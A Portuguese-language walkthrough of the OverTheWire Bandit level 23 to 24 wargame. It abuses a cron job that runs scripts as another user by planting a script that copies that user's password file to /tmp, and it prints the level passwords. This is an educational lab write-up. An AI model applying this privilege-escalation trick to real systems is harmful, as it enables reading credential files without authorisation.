# [Bandit Level 23-24](https://overthewire.org/wargames/bandit/bandit24.html)

## Descrição original
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Introdução
O objetivo desse level é analisar um programa que está sendo executado em intervalos regulares em **/etc/cron.d/**. Nesse diretório posso verificar as configurações e quais comandos estão sendo utilizados.

O desafio ainda fornece duas notas:

1ª: Será necessário criar um shell-script.

2ª: O script criado será removido assim que for executado, então é interessante manter um cópia por perto.

## Comandos utilizados:

```
ssh: permite que você acesse e controle um computador remoto de forma segura, como se estivesse interagindo diretamente com a máquina.

-p: determina em qual porta a conexão com o servidor será realizada.
```

```
ls: lista o conteúdo do diretório especificado.

-l: lista os arquivos e diretórios de um determinado diretório em formato de lista incluindo detalhes como permissões, grupo e tamanho.
```

```
whoami: exibe o nome do usuário que está atualmente logado no terminal ou no sistema operacional.
```

```
cat: exibe o conteúdo de um ou mais arquivos de texto diretamente no terminal.
```

```
vim: é um editor de texto altamente configurável e poderoso, amplamente utilizado em sistemas Unix-like, como Linux. 

:wq (Write and Quit): Ao combinar os comandos :w e :q, você pode salvar as alterações no arquivo e sair do Vim ao mesmo tempo.
```

```
chmod 755: usado no sistema Linux para alterar as permissões de arquivos e diretórios. 

Primeiro Dígito (7): Representa as permissões do proprietário do arquivo/diretório.
7 em binário é 111, o que significa que o proprietário tem permissão de leitura (4), escrita (2) e execução (1).

Segundo Dígito (5): Representa as permissões do grupo ao qual o arquivo/diretório pertence.
5 em binário é 101, o que significa que o grupo tem permissão de leitura (4) e execução (1), mas não tem permissão de escrita (2).

Terceiro Dígito (5): Representa as permissões de outros usuários (não proprietário e não pertencentes ao grupo).
5 em binário é 101, o que significa que outros usuários têm permissão de leitura (4) e execução (1), mas não têm permissão de escrita (2).
```

## Resolução

```
┌──(lufeltz㉿lufeltz)-[~]
└─$ ssh bandit23@bandit.labs.overthewire.org -p 2220
```

Logo após iniciar essa conexão com o **ssh** informo o password obtido no desafio anterior.

```
bandit23@bandit.labs.overthewire.org's password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```

```console
bandit23@bandit:~$ whoami
bandit23
```

Realizado o login vejo quais arquivos estão no diretório **/etc/cron.d/**:

```console
bandit23@bandit:~$ ls -l /etc/cron.d
total 36
-rw-r--r-- 1 root root  62 Apr 23 18:04 cronjob_bandit15_root
-rw-r--r-- 1 root root  62 Apr 23 18:04 cronjob_bandit17_root
-rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit22
-rw-r--r-- 1 root root 122 Apr 23 18:04 cronjob_bandit23
-rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit24
-rw-r--r-- 1 root root  62 Apr 23 18:04 cronjob_bandit25_root
-rw-r--r-- 1 root root 201 Jan  8  2022 e2scrub_all
-rwx------ 1 root root  52 Apr 23 18:05 otw-tmp-dir
-rw-r--r-- 1 root root 396 Feb  2  2021 sysstat
```

Como o objetivo é encontrar o password do level **bandit24**, vou visualizar o conteúdo do arquivo **cronjob_bandit24:**

```console
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

Dentro desse arquivo existe um código envolvendo o arquivo de script **cronjob_bandit24.sh**.

Note também que o script está sendo executado como o usuário **bandit24.** Portanto o resultado de **whoami** e consequentemente de **$myname** no script **cronjob_bandit24.sh** será **bandit24.**

Vejo o conteúdo do script:

```console
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done
```

Esse script está basicamente executando e excluindo cada um dos scripts que estejam localizados no diretório **/var/spool/$myname/foo.**

Sabendo disso vou criar um script dentro do diretório **/tmp/desafio23** e depois copiá-lo para **/var/spool/bandit24/foo** para ser executado.

```console
bandit23@bandit:~$ mkdir /tmp/desafio23
bandit23@bandit:~$ vim /tmp/desafio23/script23.sh
```
O **script23.sh** ficou dessa forma:

```console
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/pass_bandit24.txt

```
Como ele será executado como o usuário **bandit24** eu vou utilizar isso para ter acesso ao password desse level e salvá-lo no arquivo **pass_bandit24.txt** que está em meu controle.

    Utilizei o vim, porém poderia ser utilizado qualquer editor de texto para criar o script. No vim depois de abrir o arquivo basta digitar i para começar escrever, utilizar o esc para fechar o modo de escrita e :wq para salvar o conteúdo(w) e sair(q).


O arquivo **script23.sh** possui no momento essas permissões:

```console
bandit23@bandit:~$ ls -l /tmp/desafio23
total 4
-rw-rw-r-- 1 bandit23 bandit23 78 Aug 13 20:56 script23.sh
```

Já que é necessário que ele seja executado em outros usuários vou conceder permissão de execução para todos eles:

```console
bandit23@bandit:~$ chmod 755 /tmp/desafio23/script23.sh
bandit23@bandit:~$ ls -l /tmp/desafio23
total 4
-rwxr-xr-x 1 bandit23 bandit23 78 Aug 13 20:56 script23.sh
```

Como pode ser visto esse arquivo agora tem permissão de execução(x) em todos os usuários.

Agora só falta copiá-lo para **/var/spool/bandit24/foo** e aguardar ele ser executado:

```console
bandit23@bandit:~$ cp /tmp/desafio23/script23.sh /var/spool/bandit24/foo/

bandit23@bandit:~$ ls -l /var/spool/bandit24/foo/script23.sh
-rwxr-xr-x 1 bandit23 bandit23 78 Aug 13 21:08 /var/spool/bandit24/foo/script23.sh    
```

Para confirmar se o arquivo foi executado posso usar o comando ls:
```console
bandit23@bandit:~$ ls /var/spool/bandit24/foo/script23.sh
ls: cannot access '/var/spool/bandit24/foo/script23.sh': No such file or directory
```
Caso apareça essa mensagem de arquivo ou diretório inexistente o arquivo já foi executado e removido.

Após o script ser executado vejo o conteúdo do arquivo **pass_bandit24.txt**.

```console
bandit23@bandit:~$ cat /tmp/pass_bandit24.txt
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

Dessa forma encontro o password do próximo level **bandit24**:

    VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

Por fim saio do usuário atual por meio do comando exit.

```console
bandit23@bandit:~$ exit
logout
Connection to bandit.labs.overthewire.org closed.
```